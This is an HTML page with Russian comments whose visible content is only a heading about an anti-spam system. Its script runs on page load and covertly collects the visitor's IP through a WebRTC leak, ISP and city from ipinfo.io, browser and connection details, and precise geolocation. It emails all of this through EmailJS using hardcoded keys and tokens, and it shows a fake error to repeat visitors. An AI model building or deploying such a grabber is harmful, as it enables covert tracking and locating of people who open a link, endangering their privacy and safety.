<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send User Data</title>

    <!-- Подключение актуального EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("nRcxesuNKhp7AMc4d");  // Ваш публичный User ID
        })();

        // Получение IP-адреса
        function getUserIP(onNewIP) {
            var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            var pc = new myPeerConnection({
                iceServers: []
            }),
            noop = function() {},
            localIPs = {},
            ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;

            function iterateIP(ip) {
                if (!localIPs[ip]) onNewIP(ip);
                localIPs[ip] = true;
            }

            pc.createDataChannel("");
            pc.createOffer().then(function(sdp) {
                sdp.sdp.split('\n').forEach(function(line) {
                    if (line.indexOf('candidate') < 0) return;
                    line.match(ipRegex).forEach(iterateIP);
                });
                pc.setLocalDescription(sdp, noop, noop);
            }).catch(function(reason) {});

            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;
                ice.candidate.candidate.match(ipRegex).forEach(iterateIP);
            };
        }

        // Получение данных о провайдере и IP с помощью IPinfo.io
        async function getIPAndProvider() {
            const token = "229d6455ecea02"; // ваш API токен от ipinfo.io
            let ipInfo = {};

            try {
                const response = await fetch(`https://ipinfo.io/?token=${token}`);
                ipInfo = await response.json();
            } catch (error) {
                console.error("Ошибка при получении информации о IP:", error);
            }

            return ipInfo;
        }

        // Отправка данных на почту
        function sendData(userData) {
            emailjs.send("Hjikwe21782", "template_73zczgq", userData)
                .then(function(response) {
                    console.log("Email sent successfully", response);
                    alert('Данные отправлены на вашу почту!');
                    if (userData.ip) {
                        markIpAsSent(userData.ip); // Помечаем IP как отправленный
                    }
                }, function(error) {
                    console.error("Failed to send email", error);
                    alert("Ошибка при отправке данных: " + error.text);
                });
        }

        // Проверка, отправлялись ли данные с этого IP
        function isIpAlreadySent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            return sentIps[ip] && sentIps[ip].locationSent;
        }

        // Пометка IP как отправленного с геолокацией
        function markIpAsSent(ip) {
            let sentIps = JSON.parse(localStorage.getItem('sentIps')) || {};
            sentIps[ip] = { locationSent: true };
            localStorage.setItem('sentIps', JSON.stringify(sentIps));
        }

        // Отображение сообщения об ошибке на экране
        function showError(message) {
            const errorElement = document.createElement('div');
            errorElement.textContent = message;
            errorElement.style.color = 'red';
            errorElement.style.fontWeight = 'bold';
            errorElement.style.marginTop = '20px';
            document.body.appendChild(errorElement);
        }

        // Получение всех данных о пользователе
        async function getUserData() {
            getUserIP(async function(ip) {
                console.log("Получен IP:", ip);

                // Проверяем, был ли этот IP уже отправлен
                if (isIpAlreadySent(ip)) {
                    console.log("Этот IP уже отправлял данные. Отправка отменена.");
                    showError("Error(136)"); // Показ сообщения об ошибке
                    return;
                }

                let userData = { ip: ip };

                // Получаем данные о провайдере и IP
                const ipInfo = await getIPAndProvider();
                userData.ipProvider = ipInfo.org || "Неизвестен";
                userData.ipCity = ipInfo.city || "Неизвестен";
                userData.ipCountry = ipInfo.country || "Неизвестен";
                userData.ipLocation = ipInfo.loc || "Неизвестно";

                console.log("Информация о провайдере и IP:", ipInfo);

                // Получаем информацию о браузере
                userData.userAgent = navigator.userAgent;
                userData.browserLanguage = navigator.language;
                userData.screenResolution = `${window.screen.width}x${window.screen.height}`;
                userData.timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                // Получаем информацию о соединении
                userData.connectionType = navigator.connection.effectiveType || "Неизвестен";
                userData.connectionSpeed = navigator.connection.downlink || "Неизвестна";

                // Получаем местоположение пользователя
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        userData.location = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        console.log("Геолокация получена:", userData.location);
                        sendData(userData);
                    }, function(error) {
                        alert('Ошибка при получении геолокации: ' + error.message);
                        sendData(userData);  // Отправка данных только с IP
                    });
                } else {
                    alert("Геолокация не поддерживается этим браузером.");
                    sendData(userData);  // Отправка данных только с IP
                }
            });
        }

        window.onload = function() {
            getUserData();
        }
    </script>
</head>
<body>
    <h1>Отправка данных с анти-спам системой</h1>
</body>
</html>